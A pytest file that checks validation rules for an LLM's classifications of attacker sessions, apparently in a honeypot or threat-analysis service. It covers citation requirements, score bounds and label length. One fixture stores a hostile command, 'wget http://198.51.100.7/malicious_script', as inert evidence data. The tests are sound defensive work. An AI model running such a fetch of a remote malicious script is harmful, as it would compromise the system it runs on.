import pytest
from pydantic import ValidationError

from app.services.llm.schemas import ClassificationResult, EvidenceCitation


def test_classification_requires_at_least_one_citation() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet dropper",
            confidence=0.9,
            risk_score=87,
            risk="critical",
            behavior_summary="Downloaded and ran a script.",
            evidence=[],
        )


def test_confidence_outside_zero_to_one_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet dropper",
            confidence=90,
            risk_score=87,
            risk="critical",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_risk_score_outside_zero_to_hundred_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet dropper",
            confidence=0.9,
            risk_score=870,
            risk="critical",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_unknown_risk_level_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet dropper",
            confidence=0.9,
            risk_score=87,
            risk="apocalyptic",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_valid_classification_is_accepted() -> None:
    result = ClassificationResult(
        classification="Automated botnet dropper",
        confidence=0.91,
        risk_score=87,
        risk="critical",
        behavior_summary="Downloaded and executed a remote script.",
        evidence=[
            EvidenceCitation(
                event_id="seed-botnet-01-008",
                artifact="wget http://198.51.100.7/malicious_script",
            )
        ],
    )
    assert result.evidence[0].event_id == "seed-botnet-01-008"


def test_an_unbounded_classification_label_is_rejected() -> None:
    """`classification` is the model's free text, written after it read
    attacker-chosen commands, and it goes on to be interpolated into the
    recommend prompt, stored, used as a report title and indexed into
    Elasticsearch as `ai_classification` -- a `keyword`, where past Lucene's
    term limit the enrichment write fails and the session stays silently
    un-enriched. Rejecting it here degrades to the visible "Unclassified"
    fallback instead.
    """
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="A" * 5000,
            confidence=0.5,
            risk_score=10,
            risk="low",
            behavior_summary="ok",
            evidence=[EvidenceCitation(event_id="e-1", artifact="ls")],
        )


def test_a_long_behavior_summary_is_still_accepted() -> None:
    """Deliberately unbounded: `_merge_classifications` concatenates one
    summary per chunk, so a per-call bound would be breached by our own
    merge -- a ValidationError in our code, aborting a completed analysis
    rather than degrading it."""
    result = ClassificationResult(
        classification="Automated botnet dropper",
        confidence=0.5,
        risk_score=10,
        risk="low",
        behavior_summary="B" * 20000,
        evidence=[EvidenceCitation(event_id="e-1", artifact="ls")],
    )
    assert len(result.behavior_summary) == 20000
